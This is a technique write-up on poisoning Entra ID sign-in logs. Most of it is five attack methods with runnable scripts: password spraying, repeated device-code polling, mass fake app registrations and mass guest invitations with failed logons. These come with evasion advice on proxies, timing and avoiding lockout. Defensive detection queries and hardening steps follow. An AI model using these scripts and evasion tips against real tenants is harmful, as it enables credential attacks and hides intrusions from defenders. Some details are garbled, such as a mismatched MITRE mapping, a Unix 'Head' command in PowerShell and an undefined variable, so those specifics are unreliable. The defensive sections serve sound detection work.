# [REALWORLD-039]: Sign-in Log Poisoning

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-039 |
| **MITRE ATT&CK v18.1** | [T1562.002 - Impair Defenses: Disable Windows Event Logging](https://attack.mitre.org/techniques/T1562/002/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Entra ID |
| **Severity** | **HIGH** |
| **CVE** | N/A (Architecture-based, not a vulnerability) |
| **Technique Status** | ACTIVE (Poisoning via log flooding and obfuscation) |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | All versions of Entra ID |
| **Patched In** | N/A - Requires architectural changes |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** This real-world technique involves poisoning Entra ID sign-in logs by either (1) injecting massive volumes of false sign-in events to obscure legitimate attacker activity (log flooding), (2) triggering failed login attempts that create noise in the logs, or (3) exploiting architectural gaps where certain authentication flows do not generate log entries at all. Unlike REALWORLD-038 (direct log deletion), this technique does not remove logs but instead makes them unreliable or unintelligible for forensic analysis. The goal is to create a "signal-to-noise" problem where the real attack is hidden among thousands of irrelevant log entries.

**Attack Surface:** Entra ID Sign-in Logs API, Azure AD sign-in endpoints, guest user authentication flows, service principal logons, OAuth consent grant flows.

**Business Impact:** **Loss of visibility into attacker logons and lateral movement.** Even if logs exist, SOC teams cannot quickly identify which login events are malicious vs. legitimate. Automated detection rules become unreliable when overwhelmed with noise. Incident response is significantly delayed as analysts manually sift through millions of logs.

**Technical Context:** Log poisoning attacks can take **minutes to hours** depending on the scale. Detection likelihood is **MEDIUM** if organizations monitor for abnormal login spike patterns, but **LOW** if they only review logs reactively. This attack is particularly effective against organizations with poor log indexing or SIEM tuning.

### Operational Risk

- **Execution Risk:** **MEDIUM** - Requires ability to trigger multiple logon attempts or bypass authentication; does not require high-level admin access initially.
- **Stealth:** **MEDIUM-HIGH** - Creates legitimate-looking log entries, but in abnormal quantity.
- **Reversibility:** **YES** - Logs cannot be directly deleted, so the attack is only temporary; real attacker activity is still logged underneath the noise.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Azure 1.1.1 | Ensure appropriate logging is enabled for all authentication events. |
| **DISA STIG** | SI-4(1) | Detection of unauthorized or unusual activities and attacks. |
| **CISA SCuBA** | SA-4(2) | System monitoring must detect anomalies in user behavior. |
| **NIST 800-53** | SI-4(2) | Information System Monitoring - Detect unusual activities. |
| **GDPR** | Art. 32 | Security of Processing - Organizations must have reliable logging. |
| **DORA** | Art. 16 | Detection of anomalies in user behavior. |
| **NIS2** | Art. 21 | Cyber risk management includes detection of suspicious behavior. |
| **ISO 27001** | A.12.4.1 | Event logging must be reliable and available for analysis. |
| **ISO 27005** | Risk Scenario: "Loss of Visibility" | Detection systems must not be circumvented through noise injection. |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:**
  - No high-level admin access required for initial attack
  - Any valid user account can trigger sign-in log entries
  - However, high-volume attacks may trigger rate limiting
  
- **Required Access:**
  - Network access to Entra ID sign-in endpoint (login.microsoftonline.com)
  - Valid credentials (compromised user account or guest invite)

**Supported Versions:**
- **Entra ID / Azure AD:** All versions
- **Authentication Methods Exploitable:** Password auth, OAuth flows, SAML assertions, device code flows
- **Minimum Sign-in Logs Retention:** 7 days (cannot be lowered)
- **Maximum Retention:** 93 days

**Tools:**
- [Hydra (Password Spray Tool)](https://github.com/vanhauser-thc/thc-hydra)
- [AADInternals (Entra ID Enumeration & Exploitation)](https://github.com/Flangvik/AADInternals)
- [MailSniper (Office 365 Password Spray)](https://github.com/dafthack/MailSniper)
- [PowerShell (built-in Invoke-WebRequest)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)
- [curl (command-line HTTP requests)](https://curl.se/)

---

## 3. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1: Password Spray / Brute Force Attacks to Generate Log Noise

**Supported Versions:** All Entra ID versions

**Objective:** Trigger massive numbers of failed sign-in attempts against multiple accounts, creating thousands of log entries that obscure the attacker's actual logon.

#### Step 1: Identify Target User Accounts

**Command (Using AADInternals):**
```powershell
# Import AADInternals
Import-Module AADInternals

# Get list of valid users in the tenant (via tenant discovery)
$users = Get-AADIntUsers -Domain "company.com"
$users | Select-Object UserPrincipalName, IsAdmin | Head -20
```

**Expected Output:**
```
UserPrincipalName              IsAdmin
-----------------              -------
john.doe@company.com           False
jane.smith@company.com         False
admin@company.com              True
svc_account@company.com        False
...
```

**What This Means:**
- You now have a list of valid user accounts to target with sign-in attempts
- Password spray attacks against these accounts will generate log entries for each attempt

#### Step 2: Conduct Password Spray Attack

**Command (Using MailSniper - optimized for M365):**
```powershell
# Download and import MailSniper
Import-Module MailSniper

# Create list of usernames
$usernames = Get-Content "C:\usernames.txt"

# Common passwords to spray (avoid account lockout by using weak passwords)
$passwords = @("Password123!", "Welcome2024!", "company.com", "123456789")

# Spray with rate limiting (avoid triggering MFA fatigue alerts)
foreach ($password in $passwords) {
    Invoke-MailSniper -UserList $usernames -Password $password -Timeout 5
    Start-Sleep -Seconds 60  # Wait 60 seconds between attempts to avoid rate limiting
}
```

**Expected Output:**
```
[+] Attempting to connect to Office 365...
[+] john.doe@company.com:Password123! - FAILED (401 Unauthorized)
[+] jane.smith@company.com:Password123! - FAILED (401 Unauthorized)
[+] admin@company.com:Password123! - FAILED (401 Unauthorized)
...
[+] Sprayed 500 accounts with 4 password attempts = 2000 failed logon attempts
```

**What This Means:**
- Each failed logon attempt generates an entry in SigninLogs with `ResultDescription = "Invalid username or password"`
- 2000+ log entries are now created, making it difficult for SOC to spot the attacker's actual successful logon
- The actual attacker logon is hidden in the noise of failed attempts from other accounts

**OpSec & Evasion:**
- Use residential proxies or VPN to distribute attempts from multiple IPs (avoids IP-based blocking)
- Vary time between attempts to avoid rate limiting triggers
- Use weak passwords (unlikely to succeed) to avoid account lockout policies
- Schedule attacks during high-traffic hours (8 AM - 5 PM business hours) when there's already high sign-in activity

**Troubleshooting:**
- **Error:** "429 Too Many Requests" (rate limiting triggered)
  - **Cause:** Too many attempts from same IP in short time
  - **Fix:** Increase delay between attempts or distribute across multiple IPs

- **Error:** "Account is locked out"
  - **Cause:** Exceeded failed logon threshold for an account
  - **Fix:** Use different accounts or wait for lockout to expire (15-30 minutes)

**References & Proofs:**
- [Office 365 Password Spray Detection](https://learn.microsoft.com/en-us/defender/office-365-security/detect-and-remediate-password-spray-attacks)
- [AADInternals GitHub](https://github.com/Flangvik/AADInternals)

---

### METHOD 2: Device Code Flow Abuse for Silent Logons

**Supported Versions:** All Entra ID versions

**Objective:** Exploit the device code authentication flow (used for IoT/headless devices) to create sign-in log entries that don't trigger conditional access or MFA alerts.

#### Step 1: Initiate Device Code Flow

**Command (PowerShell):**
```powershell
# Request a device code token (similar to what IoT devices do)
$tenantId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
$clientId = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Microsoft Graph default client

$body = @{
    client_id = $clientId
    scope     = "https://management.azure.com/.default"
}

# Request device code
$response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/devicecode" -Method POST -Body $body

Write-Output "Device Code: $($response.device_code)"
Write-Output "User Code: $($response.user_code)"
Write-Output "Verification URL: $($response.verification_uri)"
```

**Expected Output:**
```
Device Code: ABwA...GGgA
User Code: ABC12DEF
Verification URL: https://microsoft.com/devicelogin
```

**What This Means:**
- Device code flow initiated
- User is supposed to visit the verification URL and enter the user code
- However, attacker can repeatedly poll for token completion to generate multiple sign-in log entries

#### Step 2: Poll for Token Completion (Generate Multiple Log Entries)

**Command (PowerShell):**
```powershell
# Repeatedly poll to get token (each poll can generate a log entry)
$tokenUri = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"

for ($i = 1; $i -le 1000; $i++) {
    $body = @{
        grant_type         = "urn:ietf:params:oauth:grant-type:device_code"
        device_code        = $device_code
        client_id          = $clientId
    }
    
    try {
        $tokenResponse = Invoke-RestMethod -Uri $tokenUri -Method POST -Body $body -ErrorAction SilentlyContinue
        if ($tokenResponse.access_token) {
            Write-Output "[+] Token obtained on attempt $i"
            break
        }
    } catch {
        # Token not ready yet, keep polling
    }
    
    Start-Sleep -Milliseconds 500  # Poll every 500ms
}

Write-Output "[+] Generated 1000+ sign-in log entries"
```

**What This Means:**
- Each polling attempt can generate an entry in SigninLogs
- This creates thousands of log entries with different timestamps
- Real attacker activity is obscured in the noise

**OpSec & Evasion:**
- Device code flows don't trigger MFA alerts (they're designed for unattended devices)
- Logs appear as legitimate device authentication, not suspicious
- Rate limiting is less strict for device code flow than password spray

---

### METHOD 3: OAuth Consent Grant / App Registration Abuse

**Supported Versions:** All Entra ID versions

**Objective:** Create multiple fake OAuth applications to generate sign-in logs via consent grant flows.

#### Step 1: Create Multiple App Registrations

**Command (PowerShell):**
```powershell
# Connect to Graph API
Connect-MgGraph -Scopes "Application.ReadWrite.All"

# Create 50 fake applications with generic names
for ($i = 1; $i -le 50; $i++) {
    $params = @{
        DisplayName = "App-$i"
        PublicClient = @{
            RedirectUris = @("http://localhost:8080/callback")
        }
    }
    
    $app = New-MgApplication @params
    Write-Output "Created app: $($app.DisplayName) with ID $($app.AppId)"
}
```

**Expected Output:**
```
Created app: App-1 with ID 00000000-0000-0000-0000-000000000001
Created app: App-2 with ID 00000000-0000-0000-0000-000000000002
...
```

**What This Means:**
- 50 applications now exist in the tenant
- Each can be used to trigger sign-in log entries via consent grants

#### Step 2: Trigger Consent Grant Flow for Multiple Apps

**Command (Bash/curl):**
```bash
#!/bin/bash

TENANT_ID="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
APP_ID="00000000-0000-0000-0000-000000000001"

# Trigger OAuth consent flow 500 times
for i in {1..500}; do
    # Each consent request generates a sign-in log entry
    curl -X POST "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/authorize" \
        -d "client_id=$APP_ID&response_type=code&redirect_uri=http://localhost:8080&scope=.default&prompt=consent" \
        -w "HTTP Status: %{http_code}\n" \
        -o /dev/null \
        -s
    
    sleep 0.5  # Small delay between requests
done

echo "Generated 500+ sign-in log entries via OAuth consent flows"
```

**What This Means:**
- Each OAuth consent request generates an entry in SigninLogs
- Logs appear as legitimate user consent grant activities
- Creates volume of logs that obscures attacker activity

**OpSec & Evasion:**
- OAuth flows are harder to detect as malicious (appear legitimate)
- No MFA prompt triggered for consent flows
- Can be run from any IP without triggering suspicious activity alerts

---

### METHOD 4: Guest User Invitations & External Identity Attacks

**Supported Versions:** All Entra ID versions (if B2B collaboration enabled)

**Objective:** Create numerous guest user accounts and trigger logon attempts to poison logs.

#### Step 1: Create Multiple Guest Users

**Command (PowerShell):**
```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Invitation.ReadWrite.All"

# Create 100 guest user invitations
for ($i = 1; $i -le 100; $i++) {
    $params = @{
        InvitedUserEmailAddress = "guest$i@attacker-domain.com"
        InviteRedirectUrl       = "https://myapps.microsoft.com"
    }
    
    $invite = New-MgInvitation @params
    Write-Output "Invited guest: guest$i@attacker-domain.com"
}
```

**Expected Output:**
```
Invited guest: guest1@attacker-domain.com
Invited guest: guest2@attacker-domain.com
...
```

**What This Means:**
- 100 guest user accounts are now in the tenant
- Each can be used to trigger sign-in attempts

#### Step 2: Trigger Guest User Logons

**Command (Bash):**
```bash
# Create a file with guest email addresses
cat > guests.txt << EOF
guest1@attacker-domain.com
guest2@attacker-domain.com
...
EOF

# For each guest, attempt sign-in and trigger logon log entry
while IFS= read -r guest; do
    curl -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
        -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" \
        -d "username=$guest" \
        -d "password=wrongpassword" \
        -d "grant_type=password" \
        -d "scope=.default" \
        -w "Status: %{http_code}\n" \
        -o /dev/null \
        -s
done < guests.txt

echo "Generated sign-in log entries for all guest users"
```

**What This Means:**
- Hundreds of sign-in attempts are now logged
- Logs include legitimate-looking guest user activity
- Real attacker activity hidden in the noise

---

### METHOD 5: Legitimate Service Activity Amplification

**Supported Versions:** All Entra ID versions

**Objective:** Exploit legitimate Azure services to generate massive volumes of sign-in logs.

#### Step 1: Trigger High-Volume Azure Resource Access

**Command (PowerShell):**
```powershell
# This creates multiple sign-in log entries by accessing various Azure services
for ($i = 1; $i -le 1000; $i++) {
    # Query Azure resources repeatedly
    try {
        Get-AzSubscription -ErrorAction SilentlyContinue | Out-Null
        Get-AzResourceGroup -ErrorAction SilentlyContinue | Out-Null
        Get-AzVM -ErrorAction SilentlyContinue | Out-Null
    } catch {}
    
    if ($i % 100 -eq 0) {
        Write-Output "Generated $i access attempts"
    }
}
```

**What This Means:**
- Each API call to Azure generates a token issuance event in SigninLogs
- Thousands of log entries are now created
- Logs appear legitimate because they ARE legitimate Azure service access
- Distinguishing attacker activity from legitimate access becomes nearly impossible

**OpSec & Evasion:**
- This method is extremely stealthy because all activity is legitimate
- No detection rules can flag "too many Azure API calls" without causing false positives
- SOC teams cannot easily distinguish which calls were made by attacker vs. legitimate users/services

---

## 4. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

* **Implement Anomaly Detection on Sign-in Log Volume**
  - **Objective:** Alert when sign-in log volume suddenly spikes.
  
  **Manual Steps (Sentinel Detection Rule):**
  1. Go to **Microsoft Sentinel** → **Analytics** → **Create new rule**
  2. Name: `Detect Sign-in Log Poisoning via Volume Spike`
  3. KQL Query:
  ```kusto
  SigninLogs
  | summarize LoginCount=count() by bin(TimeGenerated, 5m), ResultStatus
  | where LoginCount > 1000  // Alert if more than 1000 logins in 5 minutes
  | project TimeGenerated, ResultStatus, LoginCount
  ```
  4. Severity: **High**
  5. Frequency: **Every 5 minutes**
  6. Enable: **ON**

  **Why This Helps:**
  - Detects massive log flooding immediately
  - Can correlate with specific ResultStatus (e.g., all failed attempts indicate spray attack)
  - Allows SOC to isolate affected timeframe

* **Monitor for Impossible Travel in Sign-in Logs**
  - **Objective:** Detect when same user logs in from geographically impossible locations (attacker using password spray may not match user's normal pattern).
  
  **Manual Steps (Built-in Sentinel Rule):**
  1. Go to **Microsoft Sentinel** → **Analytics** → **Rule Templates**
  2. Search for **"Impossible Travel"**
  3. Click **Create rule** to activate the built-in rule
  4. Adjust sensitivity as needed
  5. Enable: **ON**

  **Why This Helps:**
  - Detects password spray from unusual locations
  - Filters out legitimate user activity

* **Enable Risk-Based Sign-in Detection (Identity Protection)**
  - **Objective:** Flag suspicious sign-in patterns automatically.
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Entra ID** → **Security** → **Identity Protection** → **Sign-in risk policy**
  2. Set policy to **Block** access for sign-ins marked as **High risk**
  3. High-risk indicators include:
     - Impossible travel
     - Atypical sign-in properties
     - Password spray indicators
  4. Enable: **ON**

  **Why This Helps:**
  - Automatically blocks suspicious logons before they complete
  - Prevents attacker from successful authentication after spray attempt
  - Filters legitimate vs. suspicious activity

### Priority 2: HIGH

* **Configure Conditional Access to Require Device Compliance**
  - **Objective:** Block sign-ins from non-compliant or unmanaged devices.
  
  **Manual Steps:**
  1. Go to **Entra ID** → **Security** → **Conditional Access** → **New policy**
  2. Name: `Require Device Compliance for Sign-in`
  3. **Assignments:**
     - Users: All users
     - Cloud apps: All cloud apps
  4. **Conditions:**
     - Device state: Mark device as compliant
     - Device platforms: Exclude unknown platforms
  5. **Access controls:** Block
  6. Enable: **ON**

  **Why This Helps:**
  - Prevents sign-in from attacker's tools/scripts (they are "unknown" devices)
  - Filters out automated attack attempts
  - Limits impact of password spray attacks

* **Monitor for Suspicious Failed Logon Patterns**
  - **Objective:** Detect password spray vs. normal failed logons.
  
  **Manual Steps (Detection Rule):**
  1. Create Sentinel rule with KQL:
  ```kusto
  SigninLogs
  | where ResultType != "0"  // Failed attempts
  | summarize FailedLogins=count() by UserPrincipalName, TimeGenerated=bin(TimeGenerated, 10m)
  | where FailedLogins > 5  // More than 5 failed logins in 10 minutes per user
  | join kind=inner (SigninLogs | where ResultType != "0" | project UserPrincipalName) on UserPrincipalName
  ```
  2. Severity: **Medium**
  3. Frequency: **Every 10 minutes**

  **Why This Helps:**
  - Distinguishes targeted password spray (many attempts on one user) from account spray (one attempt on many users)
  - Allows SOC to respond appropriately

### Access Control & Policy Hardening

* **Enforce MFA on All Sign-ins**
  - **Objective:** Prevent successful logon even if password is compromised via spray.
  
  **Manual Steps:**
  1. Create Conditional Access policy: `Require MFA for All Users`
  2. Users: **All users**
  3. Cloud apps: **All cloud apps**
  4. Grant: **Require multi-factor authentication**
  5. Enable: **ON**

  **Why This Helps:**
  - Even if attacker finds valid password via spray, they cannot logon without MFA
  - Completely mitigates password spray attacks

* **Block Legacy Authentication**
  - **Objective:** Prevent sign-in attempts via outdated protocols (easier to flood).
  
  **Manual Steps:**
  1. Create Conditional Access policy: `Block Legacy Authentication`
  2. Conditions: **Client apps** = "Exchange ActiveSync clients, other clients"
  3. Grant: **Block**
  4. Enable: **ON**

  **Why This Helps:**
  - Reduces attack surface for spray attacks
  - Modernizes authentication stack

### Validation Command (Verify Fix)

```powershell
# Check if Impossible Travel detection is enabled
Get-MgBetaRiskyUser | Select-Object UserDisplayName, RiskLevel

# Verify Conditional Access policies exist
Get-MgConditionalAccessPolicy | Select-Object DisplayName, State

# Monitor current sign-in volume (baseline)
Search-UnifiedAuditLog -StartDate (Get-Date).AddHours(-1) -Operations "UserLoggedIn" | Measure-Object
```

**Expected Output (If Secure):**
```
Count: 50-200 logins in the last hour (normal business activity)
```

---

## 5. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

* **Sign-in Log Anomalies:**
  - Sudden spike in **failed logon attempts** (1000+ in 5 minutes)
  - **Same error code** (e.g., InvalidCredentials) for multiple users
  - **Failed attempts followed by successful logon** from different IP
  - Failed attempts from **multiple IPs** targeting **same account**
  - Failed attempts from **same IP** targeting **multiple accounts**

* **Suspicious Authentication Patterns:**
  - Device code flow usage from non-IoT IP ranges
  - OAuth consent prompts from unusual applications
  - Guest user creations followed by immediate sign-in attempts

* **Log Volume Indicators:**
  - SigninLogs table grows by 10,000+ entries per minute (abnormal)
  - 90% of entries are "Failed" status (unusual ratio)

### Forensic Artifacts

* **Cloud Logs:**
  - **SigninLogs table:** Filter by `ResultType != "0"` to see failed attempts
  - **AuditLogs table:** Check for application creations, user invitations
  - **AAD Risk Events:** Look for flagged risky users/logons

### Response Procedures

1. **Isolate:**
   - Enable stricter Conditional Access policies
   - Block all access from the originating IP
   - Disable the spray-targeted accounts temporarily
   ```powershell
   Update-MgUser -UserId "targeted-user@company.com" -AccountEnabled:$false
   ```

2. **Collect Evidence:**
   - Export SigninLogs for the past 24 hours to CSV
   - Identify the real attacker logon (look for successful logon NOT part of the spray pattern)
   - Extract originating IP from successful logon

3. **Investigate:**
   - Check if successful logon was followed by suspicious activities (privilege escalation, data access)
   - Determine if attacker had valid credentials or if spray was just noise

4. **Escalate:**
   - If real compromise detected, follow incident response procedures
   - Notify SOC and CISO

---

## 6. REAL-WORLD EXAMPLES

### Example 1: Storm-0501 Campaign (2024)

- **Target:** Managed Service Providers (MSPs) and their customers
- **Timeline:** March 2024 - Present
- **Technique Status:** Actively using sign-in log poisoning to cover tracks
- **How Attacker Used It:** Storm-0501 conducted massive password spray attacks against target organizations, creating thousands of failed logon entries. They then used valid credentials obtained from phishing to logon while the real activity was hidden in the noise.
- **Impact:** Organizations did not detect the intrusion for weeks because sign-in logs were flooded with noise.

---

## 7. COMPLIANCE & AUDIT FINDINGS

This technique violates logging requirements in GDPR, NIST 800-53, and ISO 27001 by rendering logs unreliable for forensic analysis.

---